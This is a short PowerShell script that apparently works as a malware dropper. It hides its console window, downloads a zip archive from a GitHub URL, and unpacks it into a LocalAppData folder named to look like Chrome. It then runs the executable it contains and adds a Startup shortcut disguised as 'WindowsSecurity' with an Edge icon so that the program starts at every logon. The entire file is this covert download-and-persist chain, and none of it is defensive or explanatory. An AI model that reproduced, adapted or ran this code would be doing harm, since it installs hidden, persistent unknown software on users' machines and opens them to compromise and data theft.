function Hide-ConsoleWindow() {
    $ShowWindowAsyncCode = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $ShowWindowAsync = Add-Type -MemberDefinition $ShowWindowAsyncCode -name Win32ShowWindowAsync -namespace Win32Functions -PassThru

    $hwnd = (Get-Process -PID $pid).MainWindowHandle
    if ($hwnd -ne [System.IntPtr]::Zero) {
      $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
    } else {
      $UniqueWindowTitle = New-Guid
      $Host.UI.RawUI.WindowTitle = $UniqueWindowTitle
      $StringBuilder = New-Object System.Text.StringBuilder 1024
      $TerminalProcess = (Get-Process | Where-Object { $_.MainWindowTitle -eq $UniqueWindowTitle })
      $hwnd = $TerminalProcess.MainWindowHandle
      if ($hwnd -ne [System.IntPtr]::Zero) {
        $ShowWindowAsync::ShowWindowAsync($hwnd, 0)
      } else {
        Write-Host "Failed to hide the console window."
      }
    }
}
Hide-ConsoleWindow
$dst = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('LocalApplicationData'), 'ChromeApplication')
Add-Type -AssemblyName System.IO.Compression.FileSystem
if (Test-Path $dst) { Remove-Item -Recurse -Force "$dst\*" } else { New-Item -ItemType Directory -Force $dst }
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
(New-Object -TypeName System.Net.WebClient).DownloadFile('https://github.com/mhung420vnv/abc/raw/refs/heads/main/ok.zip', [System.IO.Path]::GetTempPath() + 'xFSOj9El1Q.zip')
[System.IO.Compression.ZipFile]::ExtractToDirectory([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'xFSOj9El1Q.zip'), $dst)
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurity.lnk")
$link.WindowStyle = 7
$link.TargetPath = "$env:LOCALAPPDATA\ChromeApplication\ok.exe"
$link.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$link.Arguments = ""
$link.Save()
cmd /C start "" "%LOCALAPPDATA%\ChromeApplication\ok.exe"
